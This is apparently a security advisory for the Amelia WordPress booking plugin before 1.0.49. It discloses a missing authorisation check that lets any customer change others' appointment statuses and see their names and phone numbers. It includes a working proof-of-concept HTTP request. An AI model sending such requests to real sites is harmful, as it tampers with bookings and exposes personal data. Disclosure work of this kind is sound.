## WordPress Plugin Vulnerabilities

# Amelia < 1.0.49 - Customer+ Arbitrary Appointments Status Update

### Description

The plugin does not have proper authorisation when managing appointments, allowing any customer to update other's booking status, as well as retrieve sensitive information about the bookings, such as the full name and phone number of the person who booked it.

### Proof of Concept

1. Make a booking to become customer
2. Login to WordPress with the customer account and make the following request (the ameliaNonce can be retrieved via "wpAmeliaNonce" under the Amelia dashboard)
POST /wp-admin/admin-ajax.php?action=wpamelia\_api&call=/appointments/status/2&ameliaNonce=e9ff5220c4 HTTP/1.1
Accept: \*/\*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json;charset=utf-8
Content-Length: 711
Connection: close
Cookie: [customer+ cookies]
{"status": "approved","packageCustomerId": null}
